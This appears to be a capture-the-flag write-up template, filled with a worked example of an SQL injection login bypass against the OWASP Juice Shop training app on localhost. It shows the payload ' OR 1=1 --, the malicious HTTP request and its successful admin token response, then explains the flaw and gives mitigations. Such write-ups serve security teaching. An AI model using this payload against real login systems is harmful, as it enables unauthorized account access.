# [Challenge Name]
* **Difficulty:** ⭐⭐⭐ (3/5)
* **Category:** SQL Injection / XSS / Broken Auth
* **Risk Level:** High

## 1. Overview
Briefly describe the challenge goal.
> Example: The goal is to log in as the administrator without knowing the password using SQL Injection.

## 2. Reconnaissance
Describe how you found the vulnerability.

1.  I navigated to the Login page (`/login`).
2.  I noticed the application sends a POST request to `/rest/user/login`.
3.  I tested for SQL injection by adding a single quote `'` to the email field.

**Observation:**
The server returned a `500 Internal Server Error` with a SQL syntax error message. This indicates a potential SQL Injection vulnerability.

## 3. Exploitation

### The Payload
```sql
    ' OR 1=1 --
```

### Execution Steps
1.  Open Burp Suite and intercept the login request.
2.  Replace the `email` parameter with the payload.
3.  Forward the request.

### HTTP Traffic Analysis
Here is the captured traffic showing the attack:

**Request (Malicious)**
```http
    POST /rest/user/login HTTP/1.1
    Host: localhost:3000
    Content-Type: application/json

    {
      "email": "' OR 1=1 --",
      "password": "random_password"
    }
```

**Response (Success)**
```json
    HTTP/1.1 200 OK
    Content-Type: application/json

    {
      "authentication": {
        "token": "eyJhbGciOiJIUzI1NiIsInR...",
        "bid": 1,
        "umail": "admin@juice-sh.op"
      }
    }
```

## 4. Technical Analysis
**Why did this work?**
The backend likely constructs the SQL query using string concatenation instead of parameterized queries.

* **Vulnerable Code Logic:**
    `SELECT * FROM users WHERE email = '` + **input** + `' AND password = '...'`
* **Resulting Query:**
    `SELECT * FROM users WHERE email = '' OR 1=1 --' AND password = '...'`

The `--` comments out the rest of the query (the password check), and `1=1` is always true, allowing login as the first user in the database (Admin).

## 5. Mitigation
To prevent this vulnerability:

* Use **Parameterized Queries** (Prepared Statements) for all database access.
* Input Validation: Ensure email fields follow standard email formats.
* Use an ORM (like Sequelize or Hibernate) which handles escaping automatically.